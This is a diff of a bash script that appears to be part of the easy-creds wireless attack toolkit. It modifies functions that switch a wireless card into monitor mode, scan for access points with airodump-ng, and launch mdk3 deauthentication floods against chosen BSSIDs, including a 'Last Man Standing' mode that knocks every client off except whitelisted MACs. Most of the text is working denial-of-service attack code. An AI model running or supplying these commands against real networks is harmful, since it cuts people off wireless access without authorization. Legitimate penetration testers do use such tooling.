@@ -110,6 +110,7 @@ f_Quit(){
 
 	# The following will run for wireless AP DoS attacks
 	if [ ! -z ${dosattack} ] ; then
+	  if [ -s /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
 	  airmon-ng stop ${dosmon} &> /dev/null
 	  airmon-ng stop ${airomon} &> /dev/null
 	fi
@@ -797,7 +798,6 @@ f_mdk3aps(){
 	 sleep 3
 
 	 dosmon=$(airmon-ng | sed -n "s/.*\(mon.*${phyint}\).*/\1/p;" | cut -f1)
-
 	 echo -e "\nUsing ${dosmon} for the attack.\n\n"
 
 	 echo -e "\n\e[1;33m[*] Please stand by while we DoS the AP with BSSID Address $dosmac...\e[0m"
@@ -809,13 +809,14 @@ f_mdk3aps(){
 		xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
 	fi
 
-	 echo ps -a|grep mdk3|grep -v grep|cut -d " " -f1 > /tmp/ec/dosap-pid
+	 echo ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap-pid
 	 sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
-	 echo ps -a|grep sleep|grep -v grep|cut -d " " -f1 > /tmp/ec/sleep.pid
+	 echo ps ax|grep sleep|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/sleep.pid
 	 echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
 	else
 	 f_getbssids
 	fi
+	f_mainmenu
 }
 ##################################################
 f_lastman(){
@@ -833,33 +834,29 @@ f_lastman(){
 
 	phyint=$(airmon-ng | grep ${doswlan} | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")
 
-	echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
-	airmon-ng start ${doswlan} &
+	echo -e "\n\e[1;33m[*] Placing the wireless card in monitor mode to perform DoS attack.\e[0m"
+	airmon-ng start ${doswlan} &> /dev/null
 	sleep 3
 
 	dosmon=$(airmon-ng | sed -n "s/.*\(mon.*${phyint}\).*/\1/p;" | cut -f1)
-
-	echo -e "\nUsing ${dosmon} for attack."
-
+	echo -e "\n\e[1;33m[*] Using ${dosmon} for attack.\e[0m"
+	echo -e "\n\e[1;33m[*] Press ctrl-c to stop the attack...\e[0m"
+	sleep 3
+	
 	if [ -z ${isxrunning} ]; then
-		screen -S easy-creds -X screen -t Last-Man-Standing mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${dosmon} >/dev/null)
+		screen -S easy-creds -X screen -t Last-Man-Standing mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null)
+		ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
 	else
-		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${dosmon} >/dev/null) &
+		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null) &
+		ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
 	fi
-	echo ps -a|grep mdk3|grep -v grep|cut -d " " -f1 > /tmp/ec/dosap-pid
-	sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
-	echo ps -a|grep sleep|grep -v grep|cut -d " " -f1 > /tmp/ec/sleep.pid
-
-	airmon-ng stop ${dosmon} >/dev/null
-
-	echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
-	sleep 7
+	f_mainmenu
 }
 ##################################################
 f_getbssids(){
 	clear
 	f_Banner
-	echo -e "\n\e[1;33m[*] This will launch airodump-ng and allow you to specify the AP to DoS\e[0m\n"
+	echo -e "\n\e[1;33m[*] This will launch airodump-ng and allow you to specify the AP to DoS\e[0m"
 
 	airmon-ng | grep wlan | sed '$a\\n'
 	airowlan=
@@ -867,13 +864,13 @@ f_getbssids(){
 
 	phyint=$(airmon-ng | grep ${airowlan} | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")
 
-	echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
+	echo -e "\n\e[1;33m[*] Placing the wireless card in monitor mode to perform DoS attack.\e[0m"
 	airmon-ng start ${airowlan} > /dev/null &
 	sleep 3
 
 	airomon=$(airmon-ng | sed -n "s/.*\(mon.*${phyint}\).*/\1/p;" | cut -f1)
 
-	echo -e "\n\e[1;33m[*] Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m\n"
+	echo -e "\n\e[1;33m[*] Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m"
 
 	if [ -z ${isxrunning} ]; then
 		screen -S easy-creds -X screen -t Airodump airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv
@@ -888,13 +885,13 @@ f_getbssids(){
 	#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
 	airmon-ng stop ${airomon} &> /dev/null
 
-	echo -e "\n\e[1;33m[*] The following APs were identified:\e[0m\n"
+	echo -e "\n\e[1;33mThe following APs were identified:\e[0m"
 
 	#IFS variable allows for spaces in the name of the ESSIDs and will still display it on one line
 	SAVEIFS=${IFS}
 	IFS=$(echo -en "\n\b")
-	for apname in $(cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14| sort -u);do
-		echo [*] "$apname"
+	for apname in $(cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14|sed '/^$/d'|sed -e 's/^[ \t]*//'|sort -u);do
+		echo -e "\e[1;33m[*] ${apname} \e[0m"
 	done
 	echo
 
@@ -910,18 +907,17 @@ f_getbssids(){
 	#Make sure none of your MACs end up in the blacklist
 	diff -i /tmp/ec/ec-macs /tmp/ec/ec-white.lst | grep -v ">"|grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-dosap
 
-	echo -e "\nNow Deauthing clients from ${dosapname}.\n\nIf there is more than one BSSID, all will be attacked...\n"
+	echo -e "\n\e[1;33m[*] Now Deauthing clients from ${dosapname}.\n\t-If there is more than one BSSID, all will be attacked...\e[0m"
 	airmon-ng start ${airowlan} &> /dev/null
 	sleep 3
 
 	if [ -z ${isxrunning} ]; then
+		echo -e "\e[1;33m[*] ctrl-c the screen terminal to stop the attack\e[0m"
+		sleep 5
 		screen -S easy-creds -X screen -t MDK3-AP-DoS mdk3 ${airomon} d -b /tmp/ec/ec-dosap;(airmon-ng stop ${airomon} >/dev/null)
-		echo -e "\n Exit the MDK3-AP-DoS in the easy-creds session to stop the attack"
-		sleep 5
 	else
+		echo -e "\e[1;33m[*] close the xterm window to stop the attack...\e[0m"
 		xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 ${airomon} d -b /tmp/ec/ec-dosap;(airmon-ng stop ${airomon} >/dev/null) &
-		echo -e "\nPlease close the xterm window to stop the attack..."
-		sleep 5
 	fi
 }
 ##################################################
